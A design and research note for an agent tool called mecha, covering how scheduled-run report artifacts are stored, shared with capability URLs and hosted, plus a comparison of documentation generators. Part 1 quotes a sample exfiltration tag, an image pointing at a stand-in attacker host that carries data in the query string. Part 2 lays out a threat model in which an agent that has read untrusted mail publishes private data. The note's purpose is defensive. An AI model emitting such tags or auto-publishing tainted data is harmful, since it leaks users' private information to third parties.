# Artifacts, and where they live

Research, 2026-08-05. Raised by the user after the morning-briefing trigger
shipped: *does a scheduled run produce a markdown artifact an agent can read,
and is there a way to see what has been generated?* The answer to both is no —
this is what to build instead, and what the field has already learned.

Two questions are braided together here and want separating early:

1. **Artifacts** — a run produces a report; who can read it, where does it
   live, how is it shared, how is it taken down.
2. **Documentation hosting** — where `docs/` goes when it stops being a
   directory of markdown in a repository.

They share a word ("static site") and almost nothing else. The hard part of a
documentation site is *generation* — navigation, search, versioning, theming.
The hard part of an artifact site is *lifecycle* — permission, sharing,
revocation, and the fact that the page was written by a language model that
had been reading someone else's email an hour earlier. Picking a documentation
generator to solve the artifact problem would be answering the easy half.

---

## Part 1 — What the field actually does

### Claude Code Artifacts (Anthropic, June 2026)

The closest thing to what was asked for, and worth reading closely because the
constraints are the interesting part. Reported behaviour, from secondary
sources rather than the product docs — treat the details as indicative:

- The agent **writes an HTML or Markdown file into the project, then publishes
  it**. The source file exists in the repository first, so the artifact is a
  *view* of something you still own. That ordering matters: it means the
  artifact is never the only copy.
- Hosted on a `claude.ai` URL. Three visibility tiers: **private by default**,
  **organisation** (Team/Enterprise, viewers sign in, a viewer can be promoted
  to editor), and a **public link** requiring no sign-in.
- **A strict Content Security Policy**: no scripts, styles, or images from
  other hosts, no `fetch` or WebSocket, no backend, no stored form input, no
  multiple routes, and a 16 MiB ceiling.
- **Version history and a gallery**; republishing updates the same URL.
- An artifact that pulls live data through a connector **cannot be shared
  publicly at all**, on any plan.

**Sources disagree on the public-link tier.** Stacktree describes it as
available on paid plans; a comparison piece published by a vendor selling
artifact-sharing software describes Claude's native sharing as org-only with
no public option. The second has an obvious incentive. Anyone depending on
this should check the product directly rather than either blog.

Three of those constraints are load-bearing and generalise:

- **The CSP is the security model, not a polish item.** An agent-authored page
  is untrusted markup: the documented exfiltration pattern is a remote
  subresource — `<img src="https://attacker/?d=…">` — that fires in the
  *viewer's* browser and carries data out in the query string. This is the
  same class as the markdown-image and link-preview exfiltration attacks in
  the literature. Blocking every external request is what makes an
  agent-authored page safe to open, and it has to be enforced by the host,
  because asking the model not to emit such a tag is not enforcement.
- **A connector-backed artifact cannot be public.** Live data and open
  publication are mutually exclusive by construction rather than by warning.
- **No backend, no routes.** A self-contained page is the shape that survives
  being moved somewhere else — which is exactly what makes it portable enough
  to be worth generating in the first place.

### Codex Sites (OpenAI)

Workspace-only: viewable by team members, reportedly Business/Enterprise
preview, no external sharing. The differentiator claimed for it is in-workspace
annotation — comments that land back where the agent can see them.

### Cursor shared canvases

Public browser-accessible links, no account needed for the viewer. One-way
external distribution: no comments, no analytics.

### The third-party layer, and what it tells you

There is a small market of products that exist purely to fill gaps in the
above — anchored comments, viewer analytics, custom domains, feeding viewer
feedback back to the agent, and re-hosting Claude artifacts elsewhere. The
existence of "host your Claude artifact somewhere else" as a product category
is the tell: **the native artifact hosts are all closed loops.** You publish
into the vendor's namespace, under the vendor's identity model, and if you want
a different permission shape you leave.

### What none of them have

Measured against the W3C TAG's *Good Practices for Capability URLs* — the
2014 note that is still the reference for unguessable share links — the whole
field is missing the same three things:

- **Expiry.** A share link that works forever is a credential that never
  rotates.
- **Per-recipient URLs.** Issuing a different capability URL per recipient is
  what makes *targeted* revocation possible; one shared secret can only be
  revoked for everybody.
- **Leak-awareness.** URLs travel in referrers, browser history, chat logs and
  screenshots. The TAG's guidance — unguessable identifiers from a CSPRNG,
  server-side verification, expiry — is cheap to implement and nobody in this
  space does all of it.

That is the whole opportunity for a small self-hosted app, and it is a
genuinely small amount of code.

---

## Part 2 — The finding that matters for mecha

**Publishing an artifact is an outbound send, and mecha already has the
machinery for that.** This is the part not to get wrong.

Three distinct threats, which are easy to collapse into one and shouldn't be:

1. **The publish moves data off the machine.** A briefing distilled from two
   private mailboxes, auto-published to a URL, is exfiltration with good
   typography. The trifecta interlock exists for precisely this: a publish tool
   declares `external_send`, and the interlock refuses it once private and
   untrusted content are both in the conversation. Which, for the morning
   briefing, is *always* — mail reads arm both legs by design.
2. **The page is itself an exfiltration vehicle**, fired in the viewer's
   browser, not the agent's process. Mitigated only by the host's CSP.
3. **The viewer is not the author.** A public artifact containing a summary of
   your inbox is a privacy incident even with no attacker anywhere.

The consequence is a design that costs almost nothing, because it was built
already: **a publish tool is named in `[outbox] tools`.** The agent calls
`artifact_publish`, the loop stages it as a draft, nothing leaves, and
`mecha outbox show` displays exactly what would be published — including the
taint snapshot of the conversation that wrote it, which is already recorded on
every staged item. Release is a human reading the report and saying yes.

That composition also resolves the tension in threat 1 cleanly. Staging
deliberately skips the interlock, because staging sends nothing; so the
briefing *can* draft its own artifact every morning even with the trifecta
armed, and the publication is gated on a person. Exactly the outbox's original
argument, applied to a new sink.

**The read-back problem is separate and simpler.** The briefing's markdown is
currently written by a `notify` shell command to `~/.mecha/briefings/`, which
is outside every path jail, so no agent can read it. The fix is not a new tool
— it is writing the artifact **inside the run's own workspace**, where
`fs_read` already reaches it. Artifacts land where the agent can already go,
rather than punching a hole in the jail. The ledger records the path; the
`/triggers` detail view links it.

---

## Part 3 — Hosting, if the artifact is to be a URL

Ranked by fit for "private by default, shareable to a named person, public if I
say so, gone when I say so".

| Option | Private sharing | Public | Takedown | Cost | Notes |
|---|---|---|---|---|---|
| **Self-hosted + capability URLs** | unguessable, expiring, per-recipient | flag flip | immediate, yours | a domain | the only one that gets all three; you write it |
| **Cloudflare Pages + Access** | real SSO, named people, free ≤50 users | yes | fast | free tier | no native password; Access is the gate |
| **Netlify** | built-in password protection (paid) | yes | fast | paid for the good bit | simplest managed private |
| **Tailscale Serve** | tailnet members, real identity, never public | no (Serve) / yes (Funnel) | instant | free tier | superb for you, useless for an off-tailnet collaborator |
| **S3 + CloudFront signed URLs** | expiry built in | yes | cache-invalidation lag | pennies | expiry is native, identity is not |
| **GitHub Pages** | none (public repo ⇒ public site) | yes | commit + build | free | right for docs, wrong for artifacts |

Two things fall out.

**Tailscale Serve is the best answer to half the question and no answer to the
other half.** For a DGX behind SSH it is close to ideal — HTTPS, real identity,
nothing exposed to the internet, no reverse proxy. But "share privately with
others" in an academic context usually means a collaborator at another
institution, who is not going to join a tailnet to read a report. Serve for
yourself, capability URLs for them.

**Nothing off the shelf does this.** A search for a self-hosted app that takes
a directory, returns a link, and supports expiry plus password plus revocation
finds static site *generators* and file-sharing tools, not this. The nearest
prior art for the agent-facing half is `deploybase/mcp-server` (Apache 2.0, Go,
MCP tools over a managed hosting service) — which confirms the interface shape
is right and leaves the hosting question exactly where it was.

### If it becomes its own repository

The user's instinct is right, with one correction about where the boundary
goes. The reusable thing is **not** a site generator. It is three small pieces:

- **A service.** Takes a bundle of static files, stores it immutably under an
  id, serves it under a policy. Sets the CSP itself and refuses external
  subresources rather than trusting its input. Serves from an **origin
  distinct from anything holding credentials**, so a hostile artifact cannot
  reach an authenticated cookie.
- **A CLI**, so it is usable and testable without an agent anywhere.
- **An MCP server** wrapping the CLI, so *any* agent can publish — mecha,
  Claude Code, anything speaking MCP. Tools declare `openWorldHint` honestly,
  which is what lets a harness like mecha route them through a review gate
  without knowing what the service is.

That layering is the same one `mecha-mail` settled on (library, CLI, thin MCP
binaries) and it is what makes the thing reusable rather than mecha-shaped.

The permission model to implement, in order of value: capability URL with a
CSPRNG id → expiry → revoke-one-link → password → identity. The first three
are most of the value and about a day's work.

---

## Part 4 — Documentation hosting

Separate decision, and one where the field has a clear shape in 2026.

**A note on names:** `astropy` is the Python astronomy library; the web
framework is **Astro**, whose documentation theme is **Starlight**. Assuming
Astro was meant.

| Generator | Speed / scale | Ecosystem | Best for |
|---|---|---|---|
| **Hugo** (Go) | 10k pages in under a minute | large, Go templates | very large sites; speed above all |
| **Zensical** (Python/Rust) | 4–5× faster incremental than MkDocs | new, migrating from Material | Material for MkDocs users |
| **Astro + Starlight** (JS) | fastest of the JS set, islands | growing fast | new open-source docs |
| **Docusaurus** (React) | degrades past ~1000 pages | largest, ~3M weekly | React shops; i18n + versioning together |
| **VitePress** (Vue) | fast | Vue-only | Vue projects, and only those |
| **MkDocs Material** (Python) | fine | 60–70% of Python OSS docs | Python projects |
| **Zola** (Rust) | single binary, fast | thin | Rust projects wanting no new runtime |
| **mdBook** (Rust) | fast | Rust-native | Rust project handbooks |

**Zensical is the live story and deserves the attention it got.** It is from
the Material for MkDocs team (announced 2025-11-05, MIT), and it exists because
**MkDocs itself has been unmaintained since August 2024** and Material has
entered maintenance mode with twelve months of critical-fix support. It reads
an existing `mkdocs.yml`, keeps URLs and structure, and adds a differential
build engine and a new search. The caveat is honest and current: the module
and plugin-parity phases are still landing, with early access gated to paying
"Spark" members, and template overrides need minor MiniJinja adjustments. So:
**the right destination for anyone already on Material for MkDocs, and a bet
on an unfinished road for anyone who is not.**

For `mecha` specifically, the honest answer is that this is a small decision
badly worth over-thinking. `docs/` is ten markdown files with no navigation
structure, no versioning need and no i18n. What actually matters:

- The repository is Rust with no JavaScript toolchain. Docusaurus, Starlight
  and VitePress all mean adopting npm to publish ten markdown files.
- **Zola or mdBook** cost one static binary and nothing else, and mdBook is
  what a Rust reader expects a Rust project's handbook to look like.
- GitHub Pages hosts either for free, and the docs are public anyway.

One line from the survey worth keeping, whatever gets picked: **switching
generators after a year costs roughly ten times what adopting one costs.**
Which argues for choosing on ecosystem fit rather than on today's feature
comparison — and mecha's ecosystem is Rust.

---

## Recommendations

- **A1. Write a trigger's report into its own workspace, not `~/.mecha`.**
  Artifacts become readable by any agent jailed to that workspace, with no
  change to the path jail. Record the path on the ledger row. This is the
  smallest change and it answers the original question.
- **A2. Publishing is a tool, declared `external_send`, named in
  `[outbox] tools`.** No new safety machinery: the outbox stages it, the taint
  snapshot rides along, a human releases it. Do not add an
  auto-publish switch, and specifically do not let a scheduled trigger publish
  publicly without a person in the loop.
- **A3. The host sets the CSP and refuses external subresources.** Not the
  model, not the template. An agent-authored page is untrusted markup, and the
  documented attack fires in the viewer's browser where no interlock reaches.
- **A4. Capability URLs done properly** — CSPRNG id, expiry, one URL per
  recipient so revocation can be targeted, and no secrets in the path that
  will end up in a referrer. Three fields and a check; it is the entire
  difference between this and every native artifact host surveyed.
- **A5. If it becomes a repository: service + CLI + MCP server**, in that
  order, with the site generation being the least interesting part. Serve
  artifacts from an origin that holds no credentials.
- **D1. Docs: Zola or mdBook on GitHub Pages** for mecha, on ecosystem fit —
  no new language runtime for ten markdown files. Zensical if the docs ever
  grow into something Material-shaped, and immediately if they were ever going
  to be MkDocs.

## Deliberately not recommended

- **A docs generator as the artifact engine.** The artifact problem is
  permission and lifecycle; generation is a markdown-to-HTML call and a
  template. Coupling them buys a plugin system nobody needed and a build step
  in the publish path.
- **Auto-publishing anything.** Every failure mode in Part 2 begins with a page
  going up without a person reading it.
- **A second copy of the report as the record.** The session transcript is
  already the record. An artifact is a rendering of it, and when they disagree
  the transcript wins — same rule the `/triggers` detail view already follows.
- **Viewer analytics.** Available in the third-party layer, and it means
  tracking colleagues who opened a report you sent them.
- **Custom domains, comments, multiplayer editing** — all real features in the
  surveyed products, none of them on the path to "my briefing is a page I can
  send someone."

## Sources

- [Claude Code artifacts: publish, plans, private sharing — Stacktree](https://stacktr.ee/blog/artifacts-in-claude-code-explained)
- [Claude Code Artifacts: Ship a Coding Session as a Page](https://www.digitalapplied.com/blog/claude-code-shareable-artifacts-live-web-pages-2026)
- [AI Agent Artifact Sharing Compared: Claude, Cursor, Codex (2026) — Markloop](https://markloop.io/blog/claude-artifact-sharing-compared/)
- [Good Practices for Capability URLs — W3C TAG](https://w3ctag.github.io/capability-urls/)
- [LLM01:2025 Prompt Injection — OWASP GenAI](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)
- [Decoding Latent Attack Surfaces in LLMs: Prompt Injection via HTML in Web Summarization](https://arxiv.org/pdf/2509.05831)
- [Exploiting Web Search Tools of AI Agents for Data Exfiltration](https://arxiv.org/pdf/2510.09093)
- [Zensical — a modern static site generator (Material for MkDocs team)](https://squidfunk.github.io/mkdocs-material/blog/2025/11/05/zensical/)
- [Zensical compatibility and roadmap](https://zensical.org/compatibility/)
- [Static Site Generators 2026 Head-to-Head](https://www.youngju.dev/blog/culture/2026-05-14-static-site-generators-2026-hugo-eleventy-astro-mkdocs-docusaurus-mintlify-starlight-comparison-deep-dive.en)
- [Starlight vs Docusaurus — LogRocket](https://blog.logrocket.com/starlight-vs-docusaurus-building-documentation/)
- [Tailscale Funnel documentation](https://tailscale.com/docs/features/tailscale-funnel)
- [deploybase MCP server (Apache 2.0)](https://codeberg.org/deploybase/mcp-server)
- [Password protection for Cloudflare Pages](https://dev.to/charca/password-protection-for-cloudflare-pages-8ma)
